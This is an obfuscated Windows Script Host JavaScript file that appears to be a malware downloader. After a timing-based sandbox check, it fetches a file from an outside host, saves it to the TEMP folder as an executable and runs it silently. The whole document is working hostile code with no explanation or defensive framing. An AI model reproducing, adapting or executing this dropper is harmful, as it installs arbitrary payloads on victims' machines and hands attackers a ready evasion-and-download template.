var Y = false;
var ZY = "CreateObject";
var l = function lZ() {return WScript[ZY]("WScript.Shell");}(), I = 11;
var JG = "MSXML2.XMLHTTP";
var sT = 2123213;
var ab = 0;
function DK(A){l["Run"](A, ab, ab);};
function K(){return "" + JG;};
function P(F, UZ){ab = ab * 1; return F - UZ;};
function DK0(){return ZY;};
/*@cc_on
  @if (@_win32 || @_win64)
    Y = true;
  @end
@*/
if (Y)
{
var EX = "";
function As(){return 22;};
var hl = 0; var wA = 0;
function kA()
{
var J = new this["Date"]();
var Ot = J["getUTCMilliseconds"]();
WScript["Sleep"](As());
var J = new this["Date"]();
var MF = J["getUTCMilliseconds"]();
WScript["Sleep"](As());
var J = new this["Date"]();
var U = J["getUTCMilliseconds"]();
var hl = "Q";
hl = P(MF, Ot);
var wA = "AM";
wA = P(U, MF);
EX = "open";
return P(hl, wA);
}
var T = false;
var Hp = false;
for (var y = ab; y < As() * 1; y++){if (kA() != ab){
T = true; 
wA = "31" + 11 * hl + wA; 
Hp = true; 
break;
}}
function dd() {return ((T == true) && (T == Hp)) ? 1 : ab;};
if (T && dd() && Hp){
function G() {return l["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "kQAv7X3gVF.exe";};
 TM = K();
 Hq = WScript[ZY](TM);
 var tW = 1;
 while (tW){
try {
Hq[EX]("GET", "http://kingsstaging.consines.in/l9osaw", false);
Hq["send"]();
k = "Sleep";
for (;;){WScript[k](As() * 11); if (Hq["readystate"] >= 2 * 2) break;};
tW = ab;
} catch(y0){};
}
function o(c) {var fx = (1, 2, 3, 4, 5, c); return fx;};
JN = WScript[DK0()]("ADODB.Stream");
TM = JN;
TM[EX]();
TM["type"] = o(1);
TM["write"](Hq["ResponseBody"]);
JN["position"] = o(ab);
TM["Save" + "ToFile"](G(), 2);
JN["c"+"lose"]();
Jn = G();
DK(Jn);
}
}

